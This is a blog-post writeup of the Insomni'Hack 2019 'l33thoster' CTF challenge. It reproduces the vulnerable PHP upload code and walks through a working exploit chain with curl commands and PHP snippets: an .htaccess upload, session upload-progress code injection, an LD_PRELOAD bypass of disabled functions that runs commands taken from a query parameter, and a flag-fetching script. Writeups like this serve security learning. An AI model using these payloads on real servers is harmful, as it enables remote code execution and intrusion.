---
layout: post
title: Insomni'Hack teaser 2019 l33thoster writeup
tags: web, ctf, rce, insomnihack
---

# Description
You can host your l33t pictures <a href="http://http://35.246.234.136/">here</a>.

# The Challenge
This challenge was a PHP challenge that allowed users to upload files in custom folder, the source code was given :
```php
<?php
if (isset($_GET["source"])) 
    die(highlight_file(__FILE__));

session_start();

if (!isset($_SESSION["home"])) {
    $_SESSION["home"] = bin2hex(random_bytes(20));
}
$userdir = "images/{$_SESSION["home"]}/";
if (!file_exists($userdir)) {
    mkdir($userdir);
}

$disallowed_ext = array(
    "php",
    "php3",
    "php4",
    "php5",
    "php7",
    "pht",
    "phtm",
    "phtml",
    "phar",
    "phps",
);


if (isset($_POST["upload"])) {
    if ($_FILES['image']['error'] !== UPLOAD_ERR_OK) {
        die("yuuuge fail");
    }

    $tmp_name = $_FILES["image"]["tmp_name"];
    $name = $_FILES["image"]["name"];
    $parts = explode(".", $name);
    $ext = array_pop($parts);

    if (empty($parts[0])) {
        array_shift($parts);
    }

    if (count($parts) === 0) {
        die("lol filename is empty");
    }

    if (in_array($ext, $disallowed_ext, TRUE)) {
        die("lol nice try, but im not stupid dude...");
    }

    $image = file_get_contents($tmp_name);
    if (mb_strpos($image, "<?") !== FALSE) {
        die("why would you need php in a pic.....");
    }

    if (!exif_imagetype($tmp_name)) {
        die("not an image.");
    }

    $image_size = getimagesize($tmp_name);
    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {
        die("lol noob, your pic is not l33t enough");
    }

    $name = implode(".", $parts);
    move_uploaded_file($tmp_name, $userdir . $name . "." . $ext);
}

echo "<h3>Your <a href=$userdir>files</a>:</h3><ul>";
foreach(glob($userdir . "*") as $file) {
    echo "<li><a href='$file'>$file</a></li>";
}
echo "</ul>";

?>

<h1>Upload your pics!</h1>
<form method="POST" action="?" enctype="multipart/form-data">
    <input type="file" name="image">
    <input type="submit" name=upload>
</form>
<!-- /?source -->
1
```	

## Ideas

My first thought was that the extension check was done without case check so changing the case could work.

Also the challenge suggested we couldn't use php tags `<?`, and  we need to make the file look like an image (bypass `exif_imagetype`) with defined size `1337x1337` 

# Solving the challenge

The challenge is basically asking for a `.htaccess` upload while bypassing all restrictions, we need a valid image header that will not break `.htaccess` syntax, which is `wbmp` because it starts with a null byte and `.htaccess` will ignore that line, we craft our `.htaccess` file and add a directive to make our custom extension files be interpreted as `PHP`.
![screen1.png]({{ site.url }}/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen1.png)
We do the same thing to upload our php file with the custom extension the content isn't important.
![screen2.png]({{ site.url }}/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen2.png)

The next step is to edit `.htaccess` file and add two more directives, the first one is disable php session upload_progress cleanup, and the second one is append file which will be a custom session one.

![screen3.png]({{ site.url }}/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen3.png)
Note that PHP_SESSION_UPLOAD_PROGRESS will create a session file for me, and disabling the cleanup will not remove my files so I don't need to do any kind of race conditions.

```sh
curl -vvv http://35.246.234.136/images/cce36633671a3a556973a0b2d3592fe4371a5bde/test.xyz -H 'Cookie: PHPSESSID=xyz' -F "PHP_SESSION_UPLOAD_PROGRESS=whatever" -F "file=@/etc/passwd"
```
Now requesting our `.xyz` file in the browser shows some serialized data with interested reflected values
![screen4.png]({{ site.url }}/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen4.png)
so the file parameter is reflected here it's `file` and also whatever I put in PHP_SESSION_UPLOAD_PROGRESS, i'm gonna use one of them to inject my php code.
I'm going to intercept my curl request in burp and edit one of the parameters.
```sh
export http_proxy="http://127.0.0.1:8080/"
curl -vvv http://35.246.234.136/images/cce36633671a3a556973a0b2d3592fe4371a5bde/test.xyz -H 'Cookie: PHPSESSID=xyz' -F "PHP_SESSION_UPLOAD_PROGRESS=whatever" -F "file=@/etc/passwd"
```
![screen5.png]({{ site.url }}/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen5.png)
I changed the PHPSESSID value because the old one wasn't deleted, so we need to use a new one, need to change it in `.htaccess` as well.
Let's request our file in the browser and enjoy RCE.
![screen6.png]({{ site.url }}/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen6.png)
Trying various command execution functions results in nothing so we'd better check `phpinfo`
![screen8.png]({{ site.url }}/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen8.png)


It seems that `mail()` and `putenv()` aren't filtered, so we could overwrite `LD_PRELOAD` to our custom `.so` file and overwrite some function that mail calls.


I stumbeled across another problem of how to upload a valid `.so` file since we didn't have arbitrary upload , also `file_put_contents` and other file manipulation functions were filtered, the solution was to upload the file using our php script and `move_uploaded_file` function. 
_for more details about compiling and generating .so file please check https://corb3nik.github.io/blog/alictf-2016/homework_
```sh
curl -vvv 'http://35.246.234.136/images/cce36633671a3a556973a0b2d3592fe4371a5bde/test.xyz?0=move_uploaded_file($_FILES[%22image%22][%22tmp_name%22],%20%22/var/www/html/images/cce36633671a3a556973a0b2d3592fe4371a5bde/hack.so%22);' -F 'image=@hack.so' -g
```
Next we need to execute the following PHP code to get shell command execution.

```php
  echo putenv("LD_PRELOAD=/var/www/html/images/cce36633671a3a556973a0b2d3592fe4371a5bde/hack.so");
  echo putenv("exec=".$_GET['cmd']);
  echo mail("a", "a", "a");
  show_source("/tmp/out.txt");
```

I have used a perl payload to get reverse shell, the final step was to bypass the captcha  in the `get_flag` binary in an automated way , I have used `PHP` for this.

```php
<?php


        $descriptorspec = array(
           0 => array("pipe", "r"),  
           1 => array("pipe", "w"),  
           2 => array("file", "/tmp/error-output.txt", "a")
        );

        $cwd = '/';
        $env = array();

        $process = proc_open('/get_flag', $descriptorspec, $pipes, $cwd, $env);

        if (is_resource($process)) {

            $res = eval('return '.explode(":", fread($pipes[1], 1024))[1].';');

            fwrite($pipes[0], $res);
            close($pipes[0]);

            echo fread($pipes[1], 1024);

            echo fread($pipes[1], 1024);

            $return_value = proc_close($process);

        }
?>
```
```sh
$ php -f /tmp/file.php

INS{l33t_l33t_l33t_ich_hab_d1ch_li3b}
```
The flag is `INS{l33t_l33t_l33t_ich_hab_d1ch_li3b}`.